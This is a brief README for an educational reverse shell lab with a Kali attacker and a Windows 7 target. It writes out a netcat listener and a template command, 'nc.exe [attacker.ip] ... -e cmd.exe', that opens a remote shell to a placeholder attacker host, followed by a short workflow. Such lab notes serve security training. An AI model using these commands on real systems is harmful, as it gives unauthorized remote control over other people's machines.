# 🔴 Reverse Shell Lab

A personal lab environment for studying and testing reverse shell techniques in a **controlled, legal, isolated environment**.

> ⚠️ **Legal Disclaimer:** This lab is intended for **educational purposes only** on systems you own or have explicit written permission to test. Unauthorized use against systems you do not own is illegal.

---

## 🖥️ Lab Environment

| Role       | OS              | 
|------------|-----------------|
| Attacker   |   Kali Linux    |             
| Target     |   Windows 7     |            
| Protocol   |       Tcp       |             

---

## ⚙️ Reqiurements

### 1. VMWare

### 2. Kali Linux 

### 3. Windows 7 iso

### 4. Netcat

## 🎯 Listener Setup

nc -lvp [port no.]

## 💣 Templates (For target)

### Netcat

nc.exe [attacker.ip] [port no.] -e cmd.exe

## 🔁 Workflow

```
1. Start listener     →  nc -lvp [port no.]
2. Start an outbound connection   →  nc.exe [attacker.ip] [port no.] -e cmd.exe
4. Catch Connection   →  Connection Successfull (Windows version)
5. Enumerate              
```



